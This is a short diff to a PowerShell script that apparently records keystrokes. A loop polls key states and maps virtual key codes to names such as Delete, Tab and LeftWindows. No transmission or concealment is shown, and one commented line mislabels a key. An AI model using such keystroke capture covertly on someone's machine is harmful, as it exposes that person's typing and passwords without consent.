@@ -38,6 +38,8 @@ while ($recording) {
     if ($state -eq -32767) {
       $null = [console]::CapsLock
 
+      
+
       $key = 'NoSpecial'
       switch ($ascii) 
       # refered to https://docs.microsoft.com/en-us/uwp/api/windows.system.virtualkey?view=winrt-20348
@@ -52,8 +54,9 @@ while ($recording) {
          46 { $key = 'Delete' ; $newKey = $true }     
          9 { $key = 'Tab' ; $newKey = $true } 
          20 { $key = 'CapitalLock' ; $newKey = $true }
-         164 { $key = 'LeftAlt' ; $newKey = $true } # LeftMenu
-         # 165 { $key = 'RightAlt' ; $newKey = $true } # RightMenu
+         91 { $key = 'LeftWindows' ; $newKey = $true }
+         164 { $key = 'LeftMenu' ; $newKey = $true } # LeftAlt
+         # 165 { $key = 'LeftMenu' ; $newKey = $true } # RightAlt
       } 
 
       if ($newKey) {
